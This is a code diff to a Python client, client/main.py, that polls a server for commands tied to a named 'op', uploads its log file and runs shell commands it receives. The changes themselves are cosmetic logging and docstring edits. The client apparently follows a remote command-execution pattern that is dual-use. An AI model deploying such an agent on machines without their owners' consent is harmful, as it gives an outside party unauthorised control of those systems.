@@ -1,3 +1,6 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Filename: client/main.py
 # Native python imports
 import datetime, getpass, logging, secrets
 import stat, sys, time, threading, os, uuid
@@ -170,7 +173,8 @@ class Client:
         else:
             return self.fetch_latest_command()
     
-    def fetch_latest_command(self) -> int:
+    def fetch_latest_command(self):
+        """Fetch the most recent command for the client's given op."""
         try:
             r = requests.get(f'{self.server_addr}/op/fetch/{self.op_name}')
             if r.status_code != 200:
@@ -179,6 +183,7 @@ class Client:
             cmd_id = r.json()['data']['guid']
             return self.fetch_command(cmd_id)
         except Exception as e:
+            logger.warning('Exception encountered while fetching latest command.')
             logger.warning(e)
             return self.handle_timeout()
         else:
@@ -216,8 +221,8 @@ class Client:
         try:
             r = requests.post(f'{self.server_addr}/file/upload', files={'file': log_file_data}, data={'op_name': self.op_name})
         except Exception as e:
-            logger.warn('Exception encountered while attempting to post client log.')
-            logger.warn(e)
+            logger.warning('Exception encountered while attempting to post client log.')
+            logger.warning(e)
 
     def handle_command(self, data):
         """Executes a given command.
@@ -231,7 +236,7 @@ class Client:
             data (dict): A dictionary containing relevant information for a command, such as its type and value.
         """
         if 'type' not in data or 'cmd' not in data:
-            logger.warn(f'Command data does not contain type or command: {data}')
+            logger.warning(f'Command data does not contain type or command: {data}')
             return
         if data['type'] == 'shell':
             logger.info(f"Executing shell command: {data['cmd']}")
